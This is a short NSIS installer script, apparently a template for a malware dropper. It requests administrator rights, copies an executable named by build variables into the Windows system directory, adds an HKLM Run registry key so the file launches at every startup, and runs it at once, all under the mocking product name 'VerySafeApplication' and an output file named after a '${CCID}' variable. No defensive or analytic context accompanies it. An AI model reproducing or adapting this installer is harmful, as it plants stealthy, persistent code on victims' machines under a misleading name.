!define APP_VERSION "1.0.0"

Name "$VerySafeApplication ${APP_VERSION}"
OutFile "target/${CCID}.exe"
InstallDir "$SYSDIR\${APP_NAME}"
RequestExecutionLevel admin

Section "Install"
    SetOutPath "$SYSDIR"
    File "${APP_EXE}"

    WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" \
        "${APP_NAME}" "$SYSDIR\${APP_NAME}.exe"

    Exec "$SYSDIR\${APP_NAME}.exe"
SectionEnd
